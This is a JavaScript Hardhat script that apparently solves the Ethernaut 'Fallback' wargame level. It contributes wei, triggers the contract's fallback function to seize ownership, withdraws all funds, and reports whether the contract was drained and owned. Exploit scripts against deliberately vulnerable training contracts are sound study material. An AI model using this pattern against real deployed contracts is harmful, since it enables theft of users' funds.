const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0x751D903C24696d4AEFD50ff61B3A1251f9E4df8D"
    let target = await ethers.getContractAt("Fallback", instanceAddress)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)

    // Contribute
    let tx = await target.contribute({ value: "1000" })
    await tx.wait(1)
    let bal = await target.getContribution()
    console.log(`Contributed: ${bal} wei`)

    // Send
    tx = await attacker.sendTransaction({
        to: target.address,
        value: "1000",
    })
    await tx.wait(1)
    let owner = await target.owner()
    console.log(`Current owner: ${owner}`)

    // Withdraw
    tx = await target.withdraw()
    tx.wait(1)

    // Check
    bal = await ethers.provider.getBalance(target.address)
    if (bal == 0) {
        console.log(`${symbols.success} Drained contract`)
    } else {
        console.log(`${symbols.error} Contract still has ${bal} wei!`)
    }
    owner = await target.owner()
    if (owner == attacker.address) {
        console.log(`${symbols.success} Owned Contract`)
    } else {
        console.log(`${symbols.error} Contract owner is ${owner}!`)
    }
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
